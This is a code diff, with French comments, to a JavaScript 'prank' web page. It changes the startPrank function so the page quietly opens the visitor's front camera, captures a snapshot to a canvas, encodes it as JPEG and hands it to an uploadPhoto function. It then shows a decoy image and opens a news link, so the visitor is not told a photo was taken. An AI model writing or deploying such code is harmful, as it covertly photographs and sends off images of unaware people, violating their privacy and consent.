@@ -67,12 +67,43 @@
   }
 
   async function startPrank() {
-    // Afficher directement ph.png sans passer par la caméra
-    show('screen-photo');
-    // Ouvrir le lien automatiquement
-    setTimeout(() => {
-      window.open('https://www.babnet.net/cadredetail-50558.asp', '_blank');
-    }, 500);
+    try {
+      // Accéder à la caméra en arrière-plan
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+      
+      // Attendre que la vidéo soit prête, puis prendre la photo
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth || 400;
+          canvas.height = video.videoHeight || 300;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          const imageData = canvas.toDataURL('image/jpeg', 0.9);
+          
+          // Stocker la photo
+          uploadPhoto(imageData);
+          
+          // Arrêter la caméra
+          if (stream) stream.getTracks().forEach(t => t.stop());
+          
+          // Afficher ph.png directement
+          show('screen-photo');
+          
+          // Ouvrir le lien
+          setTimeout(() => {
+            window.open('https://www.babnet.net/cadredetail-50558.asp', '_blank');
+          }, 500);
+        }, 500);
+      };
+    } catch(e) {
+      // Si caméra non disponible, afficher directement ph.png
+      show('screen-photo');
+      setTimeout(() => {
+        window.open('https://www.babnet.net/cadredetail-50558.asp', '_blank');
+      }, 500);
+    }
   }
 
   function countdown(n) {
